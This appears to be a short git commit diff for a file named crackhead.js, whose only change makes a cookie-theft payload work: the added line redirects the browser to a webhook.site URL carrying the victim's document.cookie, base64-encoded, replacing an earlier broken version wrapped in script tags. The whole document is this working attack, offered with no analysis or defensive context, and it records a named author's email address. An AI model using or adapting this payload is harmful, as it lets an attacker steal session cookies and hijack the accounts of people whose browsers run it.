250d36cfa888ecb33f981a267a21f8e667e1ca40
Kristiyan Stefanov <kristiyan.stefanov@mail.com>
2024-04-17 00:16:58 +0300

    Update crackhead.js

--- crackhead.js
+++ crackhead.js
@@ -1,3 +1,1 @@
-<script>
-window.location = 'https://webhook.site/c769282a-78b2-48e8-9f07-bf5431ab9117?idk='+btoa(document.cookie())
-</script>
+window.location = 'https://webhook.site/c769282a-78b2-48e8-9f07-bf5431ab9117?idk='+btoa(document.cookie)
